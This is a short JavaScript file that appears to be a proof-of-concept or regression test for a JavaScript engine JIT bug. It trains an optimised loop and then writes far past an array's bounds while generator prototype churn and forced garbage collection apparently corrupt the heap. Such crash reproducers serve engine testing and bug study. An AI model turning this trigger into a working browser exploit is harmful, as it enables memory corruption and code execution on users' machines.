function opt(arr, start, end) {
    function gc() {
        for (let i = 0; i < 20; i++)
            new ArrayBuffer(0x1000000);
    }

    function trigger() {
        function* generator() {
        }   

        for (let i = 0; i < 1022; i++) {
            generator.prototype['b' + i]; 
            generator.prototype['b' + i] = 0x1234;
        }   

        gc();

        for (let i = 0; i < 1022; i++) {
            generator.prototype['b' + i] = 0x1234;
        }   
    }

    for (let i = start; i < end; i++) {
        if (i === 10) {
            i += 0;
        }   
        arr[i] = 2.3023e-320;
    }

    trigger();
}
function main() {
        let arr = new Array(100);
        arr.fill(1.1);

        for (let i = 0; i < 1000; i++) {
                opt(arr, 0, 3);
        }
        opt(arr, 0, 100000);
	console.log("hi");
}
main();
